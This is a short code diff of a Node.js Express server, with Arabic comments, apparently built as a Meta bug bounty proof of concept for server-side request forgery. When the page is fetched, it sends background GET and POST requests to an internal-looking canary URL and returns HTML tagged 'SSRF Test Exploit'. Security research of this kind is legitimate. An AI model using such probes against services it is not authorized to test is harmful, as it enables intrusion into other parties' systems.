@@ -6,12 +6,25 @@ const PORT = process.env.PORT || 3000;
 app.get('/', async (req, res) => {
     const canaryUrl = 'https://internalfb.com';
     try {
-        // إرسال طلبات الخلفية للكناري لضمان تسجيل المحاولة
+        // طلب الكناري بالخلفية لضمان تسجيل الـ Hit
         axios.get(canaryUrl, { timeout: 3000 }).catch(() => {});
         axios.post(canaryUrl, {}, { timeout: 3000 }).catch(() => {});
         
-        // إرجاع استجابة ناجحة لفيسبوك لتأكيد رمز 200
-        res.status(200).send('<html><head><title>Meta Bug Bounty PoC</title></head><body><h1>SSRF Verified</h1></body></html>');
+        // كود HTML سليم وخالٍ من الأخطاء لتقديمه لفيسبوك
+        const htmlResponse = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Meta Bug Bounty PoC</title>
+            <meta property="og:title" content="SSRF Test Exploit" />
+            <meta property="og:description" content="Testing Meta Server-Side Requests" />
+        </head>
+        <body>
+            <h1>SSRF Verified Successfully</h1>
+        </body>
+        </html>
+        `;
+        res.status(200).send(htmlResponse);
     } catch (error) {
         res.status(200).send('Success');
     }
